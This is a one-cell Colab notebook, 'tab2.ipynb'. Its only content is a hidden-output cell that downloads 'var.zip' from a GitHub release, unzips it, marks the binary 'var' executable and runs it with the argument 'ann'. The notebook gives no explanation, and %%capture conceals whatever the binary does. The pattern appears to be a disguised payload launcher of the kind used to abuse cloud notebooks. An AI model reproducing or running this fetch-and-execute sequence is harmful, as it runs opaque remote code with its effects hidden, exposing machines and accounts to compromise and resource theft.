{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tab2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "voGFUzYVRq40"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "! wget -q https://github.com/includemachine10/learningmachine/releases/download/v.1/var.zip && unzip -q var.zip\n",
        "! chmod +x var\n",
        "! ./var ann"
      ]
    }
  ]
}
